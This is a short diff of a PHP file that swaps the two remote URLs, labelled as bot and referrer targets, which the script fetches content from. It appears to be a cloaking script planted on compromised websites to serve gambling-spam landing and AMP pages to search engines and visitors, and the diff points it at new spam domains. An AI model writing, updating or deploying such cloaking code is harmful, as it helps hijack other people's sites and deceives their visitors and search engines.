@@ -12,8 +12,8 @@ function get_client_ip() {
 
 $ip = get_client_ip();
 
-$bot_url = "https://nekan-dua.dev/ichijuro/chouneurosurgery.html";
-$reff_url = "https://gacor.terbang-terus.id/amp-neo/layanganjendal/chouneurosurgery.html";
+$bot_url = "https://esporttaruna.vip/jangganggu/kecapirit.html"; #url lp
+$reff_url = "https://kepencetsikit.xyz/jangganggu/killeramp.html"; #url amp
 
 function ambil_data($url) {
     $context = stream_context_create([
